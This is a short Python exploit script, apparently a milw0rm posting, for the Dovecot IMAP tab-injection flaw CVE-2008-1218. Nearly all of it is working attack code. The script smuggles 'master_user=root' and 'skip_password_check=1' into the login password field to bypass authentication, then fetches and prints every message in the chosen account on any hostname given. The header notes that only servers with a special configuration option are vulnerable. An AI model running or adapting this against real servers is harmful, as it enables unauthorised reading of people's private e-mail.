#lame Dovecot IMAP [1.0.10 -> 1.1rc3] Exploit
#Here's an exploit for the recent TAB vulnerability in Dovecot.
#It's nothing special since in the wild there are few to none
#targets because of the special option which has to be set.
#see CVE Entry CVE-2008-1218
#Exploit written by Kingcope
import sys
import imaplib

print "Dovecot IMAP [1.0.10 -> 1.1rc2] Exploit"
print "Prints out all E-Mails for any account if special configuration option is set"
print "Exploit written by kingcope\n"

if len(sys.argv)<3:
     print "usage: %s <hostname/ip address> <account> [-nossl]" % sys.argv[0]
     exit(0);

if len(sys.argv)>3 and sys.argv[3] == "-nossl":
	M = imaplib.IMAP4(sys.argv[1])
else:
	M = imaplib.IMAP4_SSL(sys.argv[1])
M.login(sys.argv[2], "\"\tmaster_user=root\tskip_password_check=1\"");
M.select()
print "login succeeded."
typ, data = M.search(None, 'ALL')
k=0
for num in data[0].split():
    typ, data = M.fetch(num, '(RFC822)')
    print 'Message %s\n%s\n' % (num, data[0][1])
    k=k+1
M.close()
M.logout()
print "Messages read: %s" % k

# milw0rm.com [2008-03-14]